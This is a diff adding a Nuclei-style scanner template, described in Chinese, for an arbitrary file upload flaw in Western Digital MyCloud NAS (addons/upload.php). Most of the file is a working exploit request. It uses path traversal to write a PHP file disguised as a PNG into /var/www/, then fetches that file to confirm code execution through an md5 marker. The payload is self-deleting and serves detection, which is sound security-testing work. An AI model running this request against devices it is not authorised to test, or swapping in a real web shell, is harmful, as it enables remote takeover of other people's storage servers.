@@ -1,0 +1,60 @@
+id: wd-cloud-addons-upload
+info:
+  name: 西部数码 NAS addons/upload.php 任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS addons/upload.php中存在文件上传漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ydwgvl2ysgdtcp00
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: fileupload,wdcloud
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /web/addons/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        Content-Length: 418
+
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="folder"
+
+        /../../../../../../../../var/www/
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="name"
+
+        1
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="index"
+
+        2.php
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="1.png"
+
+        <?=md5(123456);unlink(__FILE__);
+        ------WebKitFormBoundary--
+      
+      - |+
+        GET /1-2.php HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'e10adc3949ba59abbe5')
+        condition: and
